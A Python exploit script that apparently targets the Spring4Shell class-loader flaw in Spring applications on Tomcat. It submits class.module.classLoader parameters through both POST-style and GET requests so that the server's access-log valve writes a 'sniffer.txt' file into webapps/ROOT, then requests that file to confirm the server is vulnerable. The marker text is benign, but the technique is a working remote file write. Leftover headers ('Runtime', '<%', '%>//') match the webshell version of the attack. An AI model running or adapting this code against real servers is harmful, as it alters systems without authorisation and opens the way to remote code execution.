#coding:utf-8
import re, json, requests
from urllib.parse import urljoin

REGEX = r"(https?://\S*?)/(\S*)"
HEADERS = {
        "suffix":"%>//",
        "c1":"Runtime",
        "c2":"<%",
        "DNT":"1",
        "Content-Type":"application/x-www-form-urlencoded"
    }
DATA = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3CVuln%20%3E%0AOh%20no!%20You%20are%20vulnerable%0A%3C/Vuln%3E&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=sniffer&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

class Exploit:
    def __init__(self, url):
        self.url = url

    def exploitPost(self):
        try:
            regSearch = re.match(REGEX, self.url)
            shellurl = regSearch[1] + "/sniffer.txt"
            res = requests.get(self.url,headers=HEADERS,data=DATA,timeout=15,allow_redirects=False, verify=False)
            if res.status_code == 405:
                return False
            shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
            if shellgo.status_code == 200:
                vulnEndpoint = regSearch[2]
                print(f"[+] Vulnerable POST endpoint:{shellurl}")
                return True
        except Exception as e:
            print(e)
            pass

    def exploitGet(self):
        try:
            regSearch = re.match(REGEX, self.url)
            shellurl = regSearch[1] + "/sniffer.txt"
            getUrl = self.url + "?" + DATA
            res = requests.get(getUrl,headers=HEADERS,timeout=15,allow_redirects=False, verify=False)
            if res.status_code == 405:
                return False
            shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
            if shellgo.status_code == 200:
                vulnEndpoint = regSearch[2]
                print(f"[+] Vulnerable GET endpoint:{shellurl}")
                return True
        except Exception as e:
            print(e)
            pass